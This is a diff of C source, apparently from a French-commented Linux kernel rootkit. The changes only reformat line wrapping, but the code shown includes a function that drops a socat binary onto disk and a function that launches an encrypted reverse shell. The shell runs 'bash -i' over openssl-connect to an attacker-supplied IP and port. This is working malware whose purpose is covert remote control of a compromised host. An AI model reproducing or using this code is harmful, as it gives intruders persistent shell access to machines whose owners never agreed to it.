@@ -43,7 +43,8 @@ int drop_socat_binaire(void) {
         return -FAILURE;
     }
     else if (written < socat_len) {
-        ERR_MSG("drop_socat_binaire: only %u bytes written, expected %u\n", written, socat_len);
+        ERR_MSG("drop_socat_binaire: only %u bytes written, expected %u\n", written,
+                socat_len);
         filp_close(f, NULL);
         return -FAILURE;
     }
@@ -81,14 +82,17 @@ int launch_reverse_shell(char *args) {
 
     // Construire la commande socat avec le port spécifié
     char cmd[256];
-    snprintf(cmd, sizeof(cmd), "%s exec:'bash -i',pty,stderr,setsid,sigint,sane openssl-connect:%s:%d,verify=0 &",
+    snprintf(cmd, sizeof(cmd),
+             "%s exec:'bash -i',pty,stderr,setsid,sigint,sane "
+             "openssl-connect:%s:%d,verify=0 &",
              SOCAT_BINARY_PATH, ip, port);
 
     // Lancer la commande
     int ret_code = exec_str_as_command(cmd, false);
 
     if (ret_code < 0) {
-        ERR_MSG("launch_reverse_shell: failed to start reverse shell on port %d\n", port);
+        ERR_MSG("launch_reverse_shell: failed to start reverse shell on port %d\n",
+                port);
         return ret_code;
     }
 
